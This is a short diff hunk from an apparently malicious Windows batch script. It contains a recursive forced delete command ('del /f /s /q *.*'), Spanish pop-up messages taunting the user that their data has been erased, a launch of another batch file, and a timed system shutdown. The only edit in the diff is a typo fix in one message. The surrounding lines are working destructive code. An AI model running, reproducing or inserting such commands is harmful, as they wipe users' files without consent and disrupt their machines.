@@ -45,7 +45,7 @@ del /f /s /q *.*
 msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
 msg * Pero mientras vamos a divertirnos
 start DonPanicMsg.bat
-msg * ahora vamos a apagar las luces pero tranquilo en 60 sec para que asimiles lo que acabas de hacer
+msg * ahora vamos a apagar las luces pero tranquilo en 60 seg para que asimiles lo que acabas de hacer
 shutdown /s /t 60
 goto :eof
 
